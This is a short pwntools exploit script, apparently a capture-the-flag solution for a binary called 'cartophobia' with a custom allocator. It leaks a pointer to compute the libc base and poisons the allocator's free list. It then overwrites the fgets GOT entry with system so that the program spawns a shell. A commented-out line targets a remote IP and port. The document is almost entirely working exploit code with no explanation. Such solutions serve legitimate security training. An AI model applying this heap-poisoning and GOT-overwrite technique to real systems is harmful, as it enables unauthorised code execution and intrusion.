from pwn import *

# context.log_level = "debug"
context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

elf = ELF("./cartophobia")
libc = ELF("./libc-2.31.so")
# io = gdb.debug("./cartophobia", "c")
io = process("./cartophobia")
# io = remote("54.197.141.30", 31337)


def alloc(idx):
    io.recvuntil(b"(e)dit\n")
    io.sendline(b"a")
    io.sendline(str(idx).encode())


def free(idx):
    io.recvuntil(b"(e)dit\n")
    io.sendline(b"f")
    io.sendline(str(idx).encode())


def puts(idx):
    io.recvuntil(b"(e)dit\n")
    io.sendline(b"p")
    io.sendline(str(idx).encode())


def edit(idx, ct):
    io.recvuntil(b"(e)dit\n")
    io.sendline(b"e")
    io.sendline(str(idx).encode())
    io.sendline(ct)


alloc(0)
alloc(1)  # at libc-0x1000
free(1)
free(0)
# 0 -> 1

puts(0)
libc_base = int.from_bytes(io.recvn(6), "little") - 0x42 + 0x1000
print(f"{libc_base = :#x}")
libc.address = libc_base

edit(1, b"/bin/sh")  # mem[1] = "/bin/sh"

edit(0, p64(elf.got["fgets"]))
alloc(2)
alloc(3)  # puts@got
edit(3, p64(libc.sym["system"]))

# fgets(mem[1]) == system("/bin/sh")
io.recvuntil(b"(e)dit\n")
io.sendline(b"e")
io.sendline(b'1')
io.interactive()
# ictf{i_made_a_custom_malloc_what_could_go_wrong}
